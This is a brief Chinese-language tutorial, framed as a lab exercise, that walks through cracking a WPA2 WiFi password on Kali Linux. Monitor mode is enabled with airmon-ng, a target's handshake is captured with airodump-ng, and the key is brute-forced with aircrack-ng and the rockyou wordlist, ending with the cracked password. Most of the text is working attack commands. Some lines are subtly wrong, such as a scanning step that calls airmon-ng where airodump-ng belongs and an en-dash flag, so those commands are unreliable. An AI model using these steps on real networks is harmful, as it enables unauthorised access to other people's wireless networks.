1.实验前确保有能打开监听模式的网卡
2.使用`sudo airmon-ng`显示无线接口信息
3.使用`sudo airmon-ng start wlan0` 将名为 wlan0 的无线网卡接口切换到监听模式，以便于后续进行WIFI的扫描
4.后续的`airmon-ng`操作都需要root权限，输入`sudo su` 进入到root模式以便于后续操作
5.输入`airmon-ng wlan0mon`监听wlan0mon接口，用来扫描WIFI
如果已经扫描到已经要破解的目标WIFI，使用Ctrl+C停止，这里已经扫描到了目标WIFI,记录一下bssid和ch的值，后续会用到
6.由于后要利用kali Linux自带的字典进行跑包从而暴力破解WIFI密码，这里我们输入 `cd /usr/share/wordlists/`进入到kali Linux的默认字典目录，然后输入 `airodump-ng -c 1 –bssid 66:9A:0B:A4:A7:18 -w nova wlan0mon`抓取该WIFI的握手包
- `-c 1` 指定要监听的信道号为1
- `-bssid 66:9A:0B:A4:A7:18`用于指定要监控的AP的BSSID
- `-w nova`意味着捕获到的数据将被保存在以 nova 为前缀的文件中
需要注意，这时需要有一台设备连接此WIFI才能获取到握手包。
这里成功获取到握手包后，使用Ctrl+C停止捕获。
7.输入命令`aircrack-ng -a2 -b 66:9A:0B:A4:A7:18 -w rockyou.txt nova-01.cap `将获取到的握手包文件利用kali Linux自带的字典进行跑包来暴力破解WIFI密码
8.得到跑包结果
如图所示，破解出密码为88888888
